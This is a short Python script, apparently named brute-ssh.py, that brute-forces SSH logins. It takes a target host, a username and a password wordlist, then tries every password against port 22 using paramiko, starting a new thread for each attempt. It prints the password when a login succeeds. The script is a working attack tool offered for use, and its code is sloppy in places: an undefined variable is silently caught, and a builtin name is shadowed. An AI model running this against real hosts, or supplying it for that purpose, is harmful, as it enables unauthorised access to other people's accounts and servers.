import paramiko
import os
import sys
import socket
import threading, time
from termcolor import colored
th = time
exit = 0
if len(sys.argv) != 4:
  print("Usage : python3 brute-ssh.py <RHOST> <UserName> <Wordlist>")
  sys.exit(0)

rhost = sys.argv[1]
username = sys.argv[2]
wordlist = sys.argv[3]

def hack_ssh(password, code=0):
  global exit
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

  try:
    ssh.connect(rhost, port=22, username=username, password=password)
    exit = 1
    print(colored(f"\n[+]The Password For {username} found :=> {password} \n", "blue", attrs=['bold']))
  except:
    print(colored(f"Incorrect Password !", 'red'))
  ssh.close()

  ssh.close()
  return code

if os.path.exists(wordlist) == False:
  print(colored("[!] WordList Not Found", 'red'))
  sys.exit(1)

with open(wordlist, 'r') as file:
  for line in file.readlines():
    try:
    	if exit == 1:
    	  t.join()
    	  exit()
    except TypeError:
    	print()
    except NameError:
    	print()
    password = line.strip()
    thread = threading.Thread(target=hack_ssh, args=(password,))
    thread.start()
    th.sleep(0.5)
	
